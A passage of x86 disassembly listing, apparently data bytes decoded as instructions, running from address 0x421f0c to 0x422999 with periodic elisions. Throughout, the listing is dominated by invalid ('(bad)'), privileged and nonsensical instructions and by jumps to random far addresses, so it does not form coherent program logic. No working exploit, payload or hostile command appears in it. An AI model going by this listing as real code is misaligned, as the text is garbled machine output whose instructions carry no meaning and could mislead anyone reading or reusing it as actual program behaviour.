  421f0c:	and    eax,0xd5b0cc25
  421f11:	into   
  421f12:	jno    0x421ebd
  421f14:	and    cl,BYTE PTR [ebp+0x4c]
  421f17:	and    DWORD PTR [eax-0x7a],esi
  421f1a:	pop    ecx
  421f1b:	out    0x37,eax
  421f1d:	add    edx,DWORD PTR [ecx]
  421f1f:	and    DWORD PTR [esi+0xb],esi
  421f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f23:	mov    DWORD PTR [edx+0xa],ebp
  421f26:	xor    bh,al
  421f28:	sbb    BYTE PTR [edi],ah
  421f2a:	cmp    al,0xc
  421f2c:	arpl   dx,sp
  421f2e:	jmp    0x421f5d
  421f30:	aas    
  421f31:	jmp    0x11d1dbb
	...
  421f96:	imul   eax,DWORD PTR [esi],0xffffff8f
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0xe32af78
  421fa4:	jl     0x421f3d
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    ah,dh
  421faf:	retf   
  421fb0:	xor    eax,0x850a47e
  421fb5:	xor    eax,0xec51549d
  421fba:	ror    BYTE PTR [ebx+0x2c7df1dd],1
  421fc0:	sbb    BYTE PTR cs:[ecx+0x2f],ah
  421fc4:	add    edx,DWORD PTR [ecx+edi*4+0x32]
  421fc8:	add    ah,bl
  421fca:	out    dx,eax
  421fcb:	ret    0x7f63
  421fce:	mov    eax,ds:0xdd445ff5
  421fd3:	cmp    DWORD PTR [ebx],0x64210a93
  421fd9:	fistp  DWORD PTR [ecx-0x7039bd9d]
  421fdf:	jmp    0x9f564bcd
  421fe4:	cmp    DWORD PTR [ebx+eiz*1+0x4c],0x5b
  421fe9:	ja     0x421f75
  421feb:	scas   al,BYTE PTR es:[edi]
  421fec:	dec    DWORD PTR [eax-0x696255ea]
  421ff2:	and    DWORD PTR [eax+0x314f7ec0],ecx
  421ff8:	or     edx,DWORD PTR [eax]
  421ffa:	xor    ch,BYTE PTR [ebp*2+0x24c10377]
  422001:	addr16 pop eax
  422003:	push   ebx
  422004:	push   eax
  422005:	lea    ecx,[edi+0x1788f65e]
  42200b:	fs (bad) 
  42200d:	dec    edi
  42200e:	adc    DWORD PTR [ebx+ebp*8+0x3],eax
  422012:	and    bh,ah
  422014:	xchg   DWORD PTR [eax+0x67],edi
  422017:	xor    BYTE PTR [eax-0x65],ch
  42201a:	add    ah,BYTE PTR [edi+0x4914d85c]
  422020:	scas   al,BYTE PTR es:[edi]
  422021:	push   cs
  422022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422023:	mov    esi,0x204bd85c
  422028:	cli    
  422029:	jmp    0xc63b534c
  42202e:	xor    BYTE PTR [ebp+0x3d],0xd2
  422032:	in     eax,0xc8
  422034:	sub    BYTE PTR [eiz*4+0xfa372e4],0x5e
  42203c:	mov    al,ds:0x1d2f3828
  422041:	test   eax,0x1808b5e6
  422046:	pop    ds
  422047:	test   DWORD PTR [esi+eax*4],0x6819ad99
  42204e:	test   DWORD PTR [ecx+0x26],ebp
  422051:	fmul   st(6),st
  422053:	jp     0x422020
  422055:	push   edi
  422056:	retf   
  422057:	pop    esp
  422058:	stc    
  422059:	and    dl,al
  42205b:	mov    edi,0x660bc2bb
  422060:	popf   
  422061:	dec    esp
  422062:	mov    ebp,0x1c35dce
  422067:	scas   al,BYTE PTR es:[edi]
  422068:	(bad)  
  42206a:	inc    edi
  42206b:	hlt    
  42206c:	js     0x422072
  42206e:	iret   
  42206f:	ins    BYTE PTR es:[edi],dx
  422070:	imul   esi,DWORD PTR [edx],0x7739893b
  422076:	lock xor edi,DWORD PTR [esi+0x74]
  42207a:	icebp  
  42207b:	popa   
  42207c:	(bad)  [esi-0x351ec599]
  422082:	add    cl,cl
  422084:	je     0x42202b
  422086:	adc    dh,0x7a
  422089:	dec    esi
  42208a:	rcr    BYTE PTR [edx-0x4bf8cbe9],0xec
  422091:	js     0x4220c1
  422093:	js     0x422049
  422095:	call   0x92c2:0x618cdd74
  42209c:	sbb    al,0x28
  42209e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209f:	xchg   ebx,eax
  4220a0:	aad    0x6d
  4220a2:	mov    bh,0x9b
  4220a4:	xor    al,0xf4
  4220a6:	test   BYTE PTR [esi+ecx*4-0x56],0x8c
  4220ab:	popa   
  4220ac:	out    dx,al
  4220ad:	jl     0x422109
  4220af:	sbb    DWORD PTR [eax+0xacdfb15],ebp
	...
  422115:	add    BYTE PTR [esi-0x284ae],ah
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0x315c
  422123:	jg     0x422186
  422125:	ror    BYTE PTR [esi],1
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [edi-0x7c654c85],bh
  422133:	leave  
  422134:	inc    esp
  422135:	mov    WORD PTR [eax+0x4d823c1b],?
  42213b:	adc    DWORD PTR [eax+ecx*4],edx
  42213e:	(bad)  
  42213f:	and    al,0x4b
  422141:	cs pop ds
  422143:	push   edx
  422144:	fst    DWORD PTR [esi+0x6a288339]
  42214a:	push   es
  42214b:	cmp    bh,BYTE PTR [ebx]
  42214d:	mov    dl,al
  42214f:	mov    cl,0xe4
  422151:	aas    
  422152:	div    DWORD PTR [ecx+0x53eab003]
  422158:	nop
  422159:	xchg   esp,eax
  42215a:	push   esp
  42215b:	lock scas eax,DWORD PTR es:[edi]
  42215d:	fdivr  QWORD PTR [ecx]
  42215f:	daa    
  422160:	mov    DWORD PTR [edx-0x2b],esp
  422163:	into   
  422164:	test   DWORD PTR [eax-0x25e2a528],ebx
  42216a:	mov    eax,0xa23db549
  42216f:	(bad)  
  422170:	ficom  DWORD PTR [edx+edx*4-0x2eca8b4a]
  422177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422178:	add    esp,DWORD PTR [ecx+eax*1]
  42217b:	inc    edx
  42217c:	sbb    al,0x8e
  42217e:	lds    ecx,FWORD PTR [esi+ebx*2+0x4d]
  422182:	arpl   WORD PTR [edx-0x56],sp
  422185:	sub    ah,BYTE PTR [eax+0x76]
  422188:	jae    0x422145
  42218a:	mov    dh,0x82
  42218c:	and    BYTE PTR [eax+0x68fe5e09],cl
  422192:	ror    eax,1
  422194:	dec    eax
  422195:	das    
  422196:	inc    ebx
  422197:	shr    BYTE PTR [edi-0x589a819a],0xa8
  42219e:	and    eax,0xed431a38
  4221a3:	add    eax,0xf47b22f7
  4221a8:	pop    eax
  4221a9:	xor    al,0x34
  4221ab:	lods   al,BYTE PTR ds:[esi]
  4221ac:	scas   eax,DWORD PTR es:[edi]
  4221ad:	push   ds
  4221ae:	cmp    BYTE PTR [esi-0x4a],cl
  4221b1:	dec    ebp
  4221b2:	int3   
  4221b3:	nop
  4221b4:	outs   dx,BYTE PTR ds:[esi]
  4221b5:	clc    
  4221b6:	cmp    al,BYTE PTR [edi-0x5e]
  4221b9:	pushf  
  4221ba:	mov    edi,0x3736b23c
  4221bf:	aad    0x9e
  4221c1:	out    dx,al
  4221c2:	in     eax,0x52
  4221c4:	ret    0xf0ac
  4221c7:	call   0x4c79:0x520836b3
  4221ce:	xor    ecx,DWORD PTR [ebp-0x2950b492]
  4221d4:	jns    0x42221a
  4221d6:	fnsave [edx+0x4]
  4221d9:	xchg   esp,eax
  4221da:	sbb    DWORD PTR [edx+0x1e],edx
  4221dd:	aaa    
  4221de:	jge    0x422173
  4221e0:	fldenv [ebx+0x2b]
  4221e3:	dec    edx
  4221e4:	and    BYTE PTR ds:0x47c8,dl
  4221e9:	in     eax,dx
  4221ea:	and    ebp,DWORD PTR [ecx-0x4a]
  4221ed:	sub    al,0x65
  4221ef:	and    al,0xcd
  4221f1:	inc    edi
  4221f2:	loope  0x4221d1
  4221f4:	fldl2e 
  4221f6:	or     DWORD PTR [esi+0x4e994e48],ecx
  4221fc:	sbb    ch,BYTE PTR [esi*4-0x7ba6f727]
  422203:	xchg   DWORD PTR [esi],ebp
  422205:	pop    ecx
  422206:	sbb    eax,0xbfca2abb
  42220b:	aad    0xe5
  42220d:	imul   BYTE PTR [ebp-0x24]
  422210:	cdq    
  422211:	xchg   ebp,eax
  422212:	clc    
  422213:	adc    bl,BYTE PTR [eax-0x57949f5e]
  422219:	cmp    dh,BYTE PTR [esi-0x7d0185fc]
  42221f:	ins    DWORD PTR es:[edi],dx
  422220:	jmp    0x4221e9
  422222:	mov    esi,0x7e6550bb
  422227:	shr    DWORD PTR [ecx],0xb3
  42222a:	std    
  42222b:	retf   0xf10a
  42222e:	shl    BYTE PTR [edx+0x65],1
  422231:	rcl    BYTE PTR [eax-0x6c],0xbe
	...
  422295:	add    BYTE PTR [edi-0x10085213],cl
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    ebx,edi
  4222a3:	pop    eax
  4222a4:	pop    ecx
  4222a5:	loop   0x4222bc
  4222a7:	imul   eax,DWORD PTR [ecx],0x0
  4222aa:	pop    es
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    BYTE PTR [edi],bh
  4222af:	loop   0x42229a
  4222b1:	stc    
  4222b2:	in     eax,0xcf
  4222b4:	jmp    0x61f9:0x956f8f6b
  4222bb:	repz gs push 0x42
  4222bf:	mov    DWORD PTR [esi+edx*1],esi
  4222c2:	add    ebp,DWORD PTR [edi-0x4ad64ec1]
  4222c8:	xor    al,0xf8
  4222ca:	cmp    DWORD PTR ds:0xed4e60ab,0x40
  4222d1:	add    al,0xab
  4222d3:	ja     0x42226d
  4222d5:	mov    ebp,0x3e964dd1
  4222da:	scas   al,BYTE PTR es:[edi]
  4222db:	int    0xf0
  4222dd:	test   DWORD PTR [edi-0xb],edi
  4222e0:	mov    cl,0x80
  4222e2:	std    
  4222e3:	cwde   
  4222e4:	ins    BYTE PTR es:[edi],dx
  4222e5:	sbb    eax,0xd40f79a7
  4222ea:	fdivr  st,st(7)
  4222ec:	push   ebx
  4222ed:	rcr    DWORD PTR [esi-0xeebc0d9],1
  4222f3:	mov    WORD PTR [edx+edx*8-0x3a914301],ds
  4222fa:	push   0x25f5d0e6
  4222ff:	iret   
  422300:	xchg   edi,eax
  422301:	pop    ss
  422302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422303:	push   eax
  422304:	jecxz  0x4222bd
  422306:	inc    eax
  422307:	push   eax
  422308:	into   
  422309:	push   0xfc701d37
  42230e:	sbb    DWORD PTR [edx+edi*1-0x47],eax
  422312:	aaa    
  422313:	mov    ch,0xae
  422315:	jmp    0x422391
  422317:	mov    ebp,0xead533cc
  42231c:	pop    ds
  42231d:	out    0xca,al
  42231f:	loop   0x422362
  422321:	fdivr  QWORD PTR [edi+ebp*4+0x19]
  422325:	cmc    
  422326:	call   0x6eef8a20
  42232b:	pusha  
  42232c:	sub    al,0x9c
  42232e:	jno    0x4222f0
  422330:	in     eax,dx
  422331:	adc    eax,0x7551983a
  422336:	(bad)  
  422337:	clc    
  422338:	leave  
  422339:	sub    cl,BYTE PTR [edx-0xb325b2e]
  42233f:	ret    0x3948
  422342:	inc    edx
  422343:	hlt    
  422344:	mov    ebx,0x6ea32eab
  422349:	hlt    
  42234a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42234b:	sbb    eax,0xa878fe1f
  422350:	scas   al,BYTE PTR es:[edi]
  422351:	out    0x0,al
  422353:	add    al,0x30
  422355:	ds cmp DWORD PTR fs:[ebx],ebx
  422359:	dec    esp
  42235a:	mov    eax,ds:0xc763ad3b
  42235f:	xchg   esp,eax
  422360:	sbb    al,0xc0
  422362:	inc    ecx
  422363:	mov    ah,0x4
  422365:	pop    ebp
  422366:	test   eax,0x37f9142a
  42236b:	push   0x3b
  42236d:	arpl   WORD PTR [edi-0x15],bx
  422370:	mov    fs,WORD PTR [edi+eiz*8-0x2476d5dd]
  422377:	jb     0x422357
  422379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42237a:	add    eax,0x1a9ec63d
  42237f:	dec    esp
  422380:	outs   dx,DWORD PTR ds:[esi]
  422381:	xlat   BYTE PTR ds:[ebx]
  422382:	sbb    esi,esp
  422384:	cmp    edx,DWORD PTR [ebx]
  422386:	mov    bl,0x4f
  422388:	pushf  
  422389:	js     0x42235e
  42238b:	push   ebp
  42238c:	add    eax,0x92f7f09a
  422391:	or     DWORD PTR [edx+0x4e06bc44],ecx
  422397:	cmc    
  422398:	mov    eax,0x607f45ea
  42239d:	test   eax,0x397fe924
  4223a2:	int3   
  4223a3:	sbb    ecx,DWORD PTR [ebx]
  4223a5:	or     edx,eax
  4223a7:	sahf   
  4223a8:	fnstsw WORD PTR [ecx-0xa]
  4223ab:	popf   
  4223ac:	dec    edx
  4223ad:	push   edi
  4223ae:	jno    0x422409
  4223b0:	sbb    dl,BYTE PTR [edx]
  4223b2:	cmp    esi,esi
  4223b4:	push   ss
	...
  422415:	add    BYTE PTR [edx-0x7e],dl
  422418:	cs imul edi,esi,0x88bb57ed
  42241f:	adc    eax,0x447a65b6
  422424:	aaa    
  422425:	xor    BYTE PTR [esp+ebp*2],bl
  422428:	add    DWORD PTR [eax],eax
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ecx+0xd],cl
  422430:	mov    ebp,0x3ec539f4
  422435:	mov    ds:0xea61850b,al
  42243a:	ror    BYTE PTR [ecx],0x7a
  42243d:	in     al,0x29
  42243f:	push   ebp
  422440:	or     al,0x97
  422442:	mov    eax,ds:0x61fa9ea5
  422447:	pop    eax
  422448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422449:	jg     0x422402
  42244b:	xor    DWORD PTR cs:[ecx+ebp*2-0x47],0xffffffff
  422451:	scas   eax,DWORD PTR es:[edi]
  422452:	outs   dx,DWORD PTR ds:[esi]
  422453:	jne    0x42240b
  422455:	int3   
  422456:	(bad)  
  422457:	sub    BYTE PTR [edx+0xe211b01],ah
  42245d:	add    al,0xc9
  42245f:	cmp    DWORD PTR [esi-0x1c],0x19
  422463:	lahf   
  422464:	add    ch,BYTE PTR [ebx+0x46]
  422467:	add    al,0x9a
  422469:	mov    esi,0xd4db4b6e
  42246e:	std    
  42246f:	bound  esi,QWORD PTR [ebx-0x7d527b53]
  422475:	pop    eax
  422476:	dec    ebp
  422477:	jge    0x422493
  422479:	and    al,0xb8
  42247b:	sbb    al,0xef
  42247d:	sahf   
  42247e:	fst    DWORD PTR [ebx]
  422480:	repz jns 0x422499
  422483:	shr    dh,cl
  422485:	fsubr  QWORD PTR [ecx]
  422487:	inc    eax
  422488:	xor    BYTE PTR [esp+ebx*8+0x69cc2752],al
  42248f:	int    0xf8
  422491:	dec    edi
  422492:	arpl   bx,si
  422494:	push   esp
  422495:	adc    BYTE PTR [edx],dh
  422497:	adc    DWORD PTR [eax-0x64],0x21
  42249b:	mov    eax,0xc6f37185
  4224a0:	repnz xchg edi,eax
  4224a2:	jl     0x4224e4
  4224a4:	push   ds
  4224a5:	loope  0x42244b
  4224a7:	call   0x3fde:0x8038640
  4224ae:	in     al,0x74
  4224b0:	stc    
  4224b1:	aam    0x61
  4224b3:	popf   
  4224b4:	jbe    0x4224e1
  4224b6:	outs   dx,BYTE PTR ds:[esi]
  4224b7:	leave  
  4224b8:	mov    bh,0x81
  4224ba:	and    ch,dl
  4224bc:	les    edx,FWORD PTR [ecx-0x6d]
  4224bf:	int    0xd3
  4224c1:	inc    ebx
  4224c2:	daa    
  4224c3:	and    dl,cl
  4224c5:	pushf  
  4224c6:	cmp    dl,BYTE PTR [esi+0x66]
  4224c9:	les    ebx,FWORD PTR ds:0x5916af8d
  4224cf:	sub    edi,DWORD PTR [ebx]
  4224d1:	pop    esp
  4224d2:	sub    DWORD PTR [ecx-0x18],0xffffffe2
  4224d6:	adc    esi,DWORD PTR [eax+0x6da26d22]
  4224dc:	jnp    0x422541
  4224de:	or     dh,BYTE PTR [edi+eax*2+0x5]
  4224e2:	call   0xcdae6eb9
  4224e7:	mov    cl,bh
  4224e9:	ins    DWORD PTR es:[edi],dx
  4224ea:	adc    BYTE PTR [eax-0x8826b5f],cl
  4224f0:	mov    bl,0x2d
  4224f2:	mov    bl,0xd8
  4224f4:	icebp  
  4224f5:	test   DWORD PTR [ebp+ebx*8+0x5e],ecx
  4224f9:	add    eax,0xc867d323
  4224fe:	lock and DWORD PTR [edi],esi
  422501:	inc    ebp
  422502:	mov    ebx,0xd4114e0e
  422507:	dec    esp
  422508:	dec    ebp
  422509:	cmp    al,BYTE PTR [edi-0x1f76a292]
  42250f:	leave  
  422510:	mov    bh,0x62
  422512:	push   eax
  422513:	jo     0x4224df
  422515:	cld    
  422516:	imul   ebx,DWORD PTR [eax-0x62],0xfeb42b26
  42251d:	dec    esi
  42251e:	jns    0x422523
  422520:	jb     0x422584
  422522:	loop   0x422544
  422524:	cmp    BYTE PTR [ebp-0x7d],dh
  422527:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422529:	aad    0x1c
  42252b:	xchg   esi,eax
  42252c:	jmp    0x9504:0x169fc28b
  422533:	ins    DWORD PTR es:[edi],dx
  422534:	mov    eax,DWORD PTR [eax]
	...
  422596:	call   0xfa77:0xbf778fae
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fcomp  DWORD PTR [ebp+0x6a]
  4225a4:	add    BYTE PTR [ebp+0x16d23],ah
  4225aa:	pop    es
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [esi-0x5326b015],dh
  4225b3:	and    eax,0x68dc4037
  4225b8:	test   BYTE PTR [ecx],cl
  4225ba:	adc    DWORD PTR [ecx-0x1b],edx
  4225bd:	mov    ?,WORD PTR [ebp+0x11]
  4225c0:	push   edx
  4225c1:	lea    ebx,[ebp+0x44]
  4225c4:	mov    esp,ds
  4225c6:	xchg   ebx,eax
  4225c7:	sbb    DWORD PTR [ebp+0x31],0x69
  4225cb:	and    ebp,DWORD PTR [ebx-0xbd7b2b0]
  4225d1:	mov    dh,0xc
  4225d3:	pop    ds
  4225d4:	retf   0xc748
  4225d7:	cmp    DWORD PTR [edx-0x1b3ec4c8],edx
  4225dd:	sub    esi,ebp
  4225df:	aaa    
  4225e0:	push   cs
  4225e1:	cs icebp 
  4225e3:	sub    dh,BYTE PTR [edx]
  4225e5:	push   esp
  4225e6:	data16 jo 0x422619
  4225e9:	stos   BYTE PTR es:[edi],al
  4225ea:	(bad)  
  4225eb:	pop    ecx
  4225ec:	lea    ebp,[edx]
  4225ee:	(bad)  
  4225f0:	into   
  4225f1:	pop    esp
  4225f2:	adc    DWORD PTR [edx-0x3ba3c297],edi
  4225f8:	int3   
  4225f9:	mov    ch,0xbc
  4225fb:	dec    ebx
  4225fc:	scas   eax,DWORD PTR es:[edi]
  4225fd:	or     al,0xbb
  4225ff:	cmp    DWORD PTR fs:[esi+0x791a6b79],0x9cbaa112
  42260a:	fxch   st(2)
  42260c:	arpl   dx,ax
  42260e:	cmp    DWORD PTR [edi-0x41774dea],esp
  422614:	enter  0x41eb,0xa0
  422618:	dec    eax
  422619:	fwait
  42261a:	xor    eax,0x14194e57
  42261f:	mov    gs,WORD PTR [edi]
  422621:	fiadd  WORD PTR [ebx]
  422623:	inc    edi
  422624:	pop    edi
  422625:	cmp    DWORD PTR [ebx],esp
  422627:	pop    es
  422628:	mov    ch,0x20
  42262a:	or     al,0x1c
  42262d:	or     cl,bl
  42262f:	jg     0x42268a
  422631:	jno    0x42266e
  422633:	bnd je 0x422699
  422636:	fs aad 0xcf
  422639:	(bad)  
  42263a:	jmp    0x42261e
  42263c:	rcr    BYTE PTR [edx-0x5470bc48],0x83
  422643:	ja     0x42261d
  422645:	push   esi
  422646:	mov    ds:0xfaf8e73f,al
  42264b:	leave  
  42264c:	mov    esp,0x6a09c85a
  422651:	jmp    0x2e1b:0x86dc5311
  422658:	ins    BYTE PTR es:[edi],dx
  422659:	push   eax
  42265a:	push   0xffffffbe
  42265c:	sub    edi,DWORD PTR [ebx]
  42265e:	hlt    
  42265f:	pushf  
  422660:	add    al,0xab
  422662:	dec    edi
  422663:	scas   al,BYTE PTR es:[edi]
  422664:	push   ds
  422665:	xchg   ebp,eax
  422666:	into   
  422667:	mov    eax,ds:0x8ec26bc3
  42266c:	pop    edx
  42266d:	neg    BYTE PTR [esi+0x11]
  422670:	outs   dx,BYTE PTR ds:[esi]
  422671:	and    dh,BYTE PTR ds:0xcb5312ea
  422677:	jno    0x42263e
  422679:	xchg   esp,eax
  42267a:	add    DWORD PTR gs:[esi],ebp
  42267d:	sti    
  42267e:	dec    ebp
  42267f:	mov    ds:0xafbd7b60,al
  422684:	dec    ebp
  422685:	xchg   esp,eax
  422686:	fnstsw WORD PTR ds:0x84ea03d4
  42268c:	dec    ecx
  42268d:	adc    BYTE PTR [ecx],ch
  42268f:	push   esp
  422690:	shr    eax,1
  422692:	mov    ch,0xf0
  422694:	je     0x42268a
  422696:	mov    DWORD PTR [ecx-0x68],ebx
  422699:	or     eax,0x94d44030
  42269e:	std    
  42269f:	ins    BYTE PTR es:[edi],dx
  4226a0:	cmp    BYTE PTR [eax-0x21f37a8a],al
  4226a6:	pushf  
  4226a7:	add    BYTE PTR [ebx-0x4b7577ef],0x8e
  4226ae:	(bad)  
  4226af:	imul   DWORD PTR [esi-0x373d9d67]
	...
  422715:	add    BYTE PTR [edi],ah
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	mov    bh,0xcb
  422724:	stc    
  422725:	data16 sub ch,BYTE PTR [esi+0x1]
  422729:	add    BYTE PTR [edi],al
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR ds:0x7b3b23e9,cl
  422733:	sub    eax,0xaf121337
  422738:	repz xchg esi,eax
  42273a:	in     eax,0xc4
  42273c:	aad    0x74
  42273e:	loopne 0x4226d8
  422740:	mov    ds:0x9da74f74,eax
  422745:	(bad)  [eax-0x1a]
  422748:	xor    eax,0xc34e4639
  42274d:	imul   ecx,DWORD PTR [ecx-0x34ed70d1],0x9ed864b9
  422757:	adc    bh,BYTE PTR [ecx+0x3064d49c]
  42275d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42275f:	jmp    0xad5e:0xc81ca7c7
  422766:	push   ss
  422767:	sub    eax,0xb1fa2d2b
  42276c:	adc    ah,BYTE PTR [edx+0x62]
  42276f:	sub    BYTE PTR [edi],al
  422771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422772:	mov    esp,0x3941eee8
  422777:	mov    ecx,0x28195da1
  42277c:	cld    
  42277d:	pop    esp
  42277e:	jno    0x422774
  422780:	ja     0x4227cb
  422782:	div    ebp
  422784:	fwait
  422785:	xchg   esi,eax
  422787:	pop    ebx
  422788:	and    al,0xb2
  42278a:	cs cwde 
  42278c:	jecxz  0x4227f2
  42278e:	mov    al,bl
  422790:	inc    edi
  422791:	enter  0x10ba,0xe
  422795:	or     DWORD PTR [eax],esi
  422797:	neg    edx
  422799:	jmp    0x4227aa
  42279b:	mov    dh,0xe8
  42279d:	sar    BYTE PTR [ebp+0x2b049219],0x86
  4227a4:	xchg   esp,eax
  4227a5:	lods   eax,DWORD PTR ds:[esi]
  4227a6:	and    esi,DWORD PTR [ecx]
  4227a8:	sbb    DWORD PTR [edi],ebx
  4227aa:	test   BYTE PTR [eax-0x7f],0x67
  4227ae:	pop    ds
  4227af:	add    DWORD PTR [ecx],esi
  4227b1:	outs   dx,BYTE PTR ds:[esi]
  4227b2:	in     al,dx
  4227b3:	rcr    DWORD PTR gs:[eax+0x7b],cl
  4227b7:	sub    dh,cl
  4227b9:	mov    edi,0x33e26af0
  4227be:	xchg   ecx,eax
  4227bf:	cld    
  4227c0:	dec    esi
  4227c1:	test   ecx,esp
  4227c3:	pushf  
  4227c4:	mov    ebx,0xa56cb19d
  4227c9:	and    DWORD PTR [edi],esi
  4227cb:	inc    edx
  4227cc:	push   ss
  4227cd:	sbb    ebp,DWORD PTR [ebx+0x5ecfc3b4]
  4227d3:	fs jb  0x422792
  4227d6:	inc    esi
  4227d7:	xchg   DWORD PTR [ecx+0xf],esp
  4227da:	rol    BYTE PTR ds:0x804f926d,cl
  4227e0:	pop    es
  4227e1:	mov    edi,0xd1189a61
  4227e6:	mov    DWORD PTR [eax+0x42],0x55ec3750
  4227ed:	cwde   
  4227ee:	lahf   
  4227ef:	xchg   ebp,eax
  4227f0:	sub    esp,DWORD PTR [eax+ebp*8-0x1bee14da]
  4227f7:	sub    BYTE PTR [edx-0x2f55cd74],0xe0
  4227fe:	add    edi,DWORD PTR [ebx-0xab49b11]
  422804:	ror    ebp,0x63
  422807:	pop    ds
  422808:	stos   BYTE PTR es:[edi],al
  422809:	(bad)  
  42280a:	das    
  42280b:	je     0x422865
  42280d:	bswap  edx
  42280f:	in     eax,dx
  422810:	leave  
  422811:	pop    ebp
  422812:	cmp    eax,0x36ae124e
  422817:	cmp    al,0x49
  422819:	mov    ecx,esi
  42281b:	shr    ebp,cl
  42281d:	pop    ds
  42281e:	test   DWORD PTR [edx],edx
  422820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422821:	cli    
  422822:	push   es
  422823:	cmp    eax,0x5f3726d1
  422828:	sub    DWORD PTR [edx],edx
  42282a:	(bad)  
  42282b:	fiadd  WORD PTR [ebp+eiz*1+0x7fa5e5de]
  422832:	mov    dh,0x86
  422834:	mov    ah,0x0
	...
  422896:	int    0x39
  422898:	mov    eax,0xef97fc97
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [esp+ecx*8]
  4228a3:	jne    0x4228af
  4228a5:	cmp    dh,BYTE PTR [ecx]
  4228a7:	outs   dx,DWORD PTR ds:[esi]
  4228a8:	add    DWORD PTR [eax],eax
  4228aa:	pop    es
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    al,ch
  4228af:	mov    DWORD PTR [ecx+0x42c928ae],ecx
  4228b5:	mov    esi,0x511a89a8
  4228ba:	mov    ah,0x99
  4228bc:	sbb    al,BYTE PTR [ebx-0x17]
  4228bf:	test   al,0x7
  4228c1:	out    0x3e,al
  4228c3:	push   es
  4228c4:	mov    edi,0x881a38f0
  4228c9:	dec    edi
  4228ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228cb:	cmc    
  4228cc:	test   BYTE PTR ds:0xdf3e5f1c,cl
  4228d2:	lods   al,BYTE PTR ds:[esi]
  4228d3:	jo     0x4228df
  4228d5:	retf   
  4228d6:	cmp    DWORD PTR [esi+0x11],esp
  4228d9:	cmp    eax,0x777bd977
  4228de:	div    DWORD PTR [ebx-0x2df195f3]
  4228e4:	sbb    eax,0xfb560d87
  4228e9:	fcom   QWORD PTR [edi]
  4228eb:	adc    ecx,ebp
  4228ed:	push   edi
  4228ee:	icebp  
  4228ef:	out    0x62,eax
  4228f1:	cdq    
  4228f2:	data16 gs mov bl,0x82
  4228f6:	and    al,0xe3
  4228f8:	add    esp,DWORD PTR [ebp-0x510a0ecd]
  4228fe:	arpl   WORD PTR [ebx],bp
  422900:	inc    ebp
  422901:	sub    DWORD PTR [edi+0x14],eax
  422904:	call   0xfe9cf3a
  422909:	(bad)  
  42290a:	outs   dx,DWORD PTR ds:[esi]
  42290b:	add    eax,0xc8541f2a
  422910:	in     eax,0xaf
  422912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422913:	lahf   
  422914:	test   BYTE PTR [ebp-0x47],0xcd
  422918:	pop    ds
  422919:	push   esp
  42291a:	or     edi,esi
  42291c:	cdq    
  42291d:	mov    dh,0x71
  42291f:	loop   0x422977
  422921:	lods   al,BYTE PTR ds:[esi]
  422922:	lock loopne 0x4228c9
  422925:	sbb    DWORD PTR [ecx-0x65],eax
  422928:	int3   
  422929:	fucomi st,st(1)
  42292b:	cld    
  42292c:	dec    esi
  42292d:	adc    eax,0x737139f8
  422932:	sti    
  422933:	pop    esp
  422934:	bound  edi,QWORD PTR [edx-0x26f5a1cc]
  42293a:	nop
  42293b:	and    eax,0xa3827a40
  422940:	enter  0xee87,0x22
  422944:	rol    BYTE PTR [edx],cl
  422946:	aad    0xd6
  422948:	push   esi
  422949:	popa   
  42294a:	push   ecx
  42294b:	sbb    al,0xd6
  42294d:	loope  0x4228cf
  42294f:	push   ebx
  422950:	jnp    0x4228f2
  422952:	mov    esi,0xf9ea6899
  422957:	fcom   DWORD PTR [edi]
  422959:	pop    esi
  42295a:	retf   0x7357
  42295d:	out    0x1f,al
  42295f:	aad    0x54
  422961:	es aam 0x22
  422964:	mov    ebx,0x2a9aec29
  422969:	mov    DWORD PTR [edi-0x60a015c0],edi
  42296f:	mov    al,ds:0x813b0dd6
  422974:	dec    esp
  422975:	adc    al,0xaf
  422977:	addr16 js 0x422918
  42297a:	neg    DWORD PTR [esi-0x4afce1fd]
  422980:	data16 rol BYTE PTR [eax-0x405f0573],0xc9
  422988:	xchg   ebp,eax
  422989:	bnd jg 0x4229a3
  42298c:	mov    dl,0xb9
  42298e:	pop    esi
  42298f:	jnp    0x422949
  422991:	std    
  422992:	stc    
  422993:	push   ebp
  422994:	add    bh,BYTE PTR [ecx]
  422996:	adc    al,0x43
  422998:	xchg   esi,eax
  422999:	cs jl  0x422a1b
